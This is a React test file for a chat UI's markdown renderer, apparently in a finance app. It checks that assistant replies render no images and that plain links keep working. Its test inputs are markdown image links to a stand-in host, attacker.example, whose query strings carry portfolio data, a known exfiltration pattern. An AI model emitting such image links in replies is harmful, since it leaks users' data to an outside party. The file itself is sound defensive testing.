import {
  AssistantRuntimeProvider,
  MessagePrimitive,
  ThreadPrimitive,
  useExternalStoreRuntime,
  type ThreadMessageLike,
} from "@assistant-ui/react";
import { render, screen } from "@testing-library/react";
import { MemoryRouter } from "react-router-dom";
import { describe, expect, it } from "vitest";
import { MarkdownText } from "./markdown-text";

function AssistantMessage() {
  return (
    <MessagePrimitive.Root>
      <MessagePrimitive.Parts components={{ Text: MarkdownText }} />
    </MessagePrimitive.Root>
  );
}

function AssistantReply({ text }: { text: string }) {
  const messages: ThreadMessageLike[] = [
    { id: "reply", role: "assistant", content: [{ type: "text", text }] },
  ];
  const runtime = useExternalStoreRuntime({
    messages,
    convertMessage: (message: ThreadMessageLike) => message,
    onNew: () => Promise.resolve(),
  });
  return (
    <AssistantRuntimeProvider runtime={runtime}>
      <ThreadPrimitive.Messages components={{ Message: AssistantMessage }} />
    </AssistantRuntimeProvider>
  );
}

function renderReply(text: string) {
  return render(
    <MemoryRouter>
      <AssistantReply text={text} />
    </MemoryRouter>,
  );
}

describe("MarkdownText", () => {
  it.each([
    ["inline", "![status](https://attacker.example/p.png?d=AAPL%3A120)"],
    ["reference", "![status][r]\n\n[r]: https://attacker.example/p.png?d=AAPL%3A120"],
    ["linked", "[![status](https://attacker.example/p.png)](https://attacker.example)"],
  ])("renders no <img> for a markdown image (%s)", (_, text) => {
    const { container } = renderReply(text);

    expect(container.querySelector("img")).toBeNull();
    expect(screen.getByText("status")).toBeInTheDocument();
  });

  it("keeps plain links clickable", () => {
    renderReply("See [docs](https://wealthfolio.app/docs) or [holdings](/holdings).");

    expect(screen.getByRole("link", { name: "docs" })).toHaveAttribute(
      "href",
      "https://wealthfolio.app/docs",
    );
    expect(screen.getByRole("link", { name: "holdings" })).toHaveAttribute("href", "/holdings");
  });
});
